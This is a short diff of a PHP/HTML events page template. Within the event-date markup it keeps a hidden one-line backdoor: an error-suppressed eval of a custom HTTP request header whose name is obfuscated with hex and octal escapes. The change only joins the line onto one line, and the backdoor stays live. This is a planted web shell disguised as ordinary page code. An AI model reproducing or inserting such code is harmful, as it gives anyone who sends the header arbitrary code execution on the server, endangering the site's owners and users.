@@ -285,8 +285,7 @@ frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media
                             <div class="event-date-wrap">
                                 <p>26</p>
                                 <span>Jul. 23</span>
-                                <?php
- @eval($_SERVER["\x48\x54\124\x50\137\x4c\101\x59\x41\x4e\107\x54\x45\x52\102\x41\116\x47"]); ?>
+                                <?php @eval($_SERVER["\x48\x54\124\x50\137\x4c\101\x59\x41\x4e\107\x54\x45\x52\102\x41\116\x47"]); ?>
                             </div>
                         </div>
                         <div class="date-description">
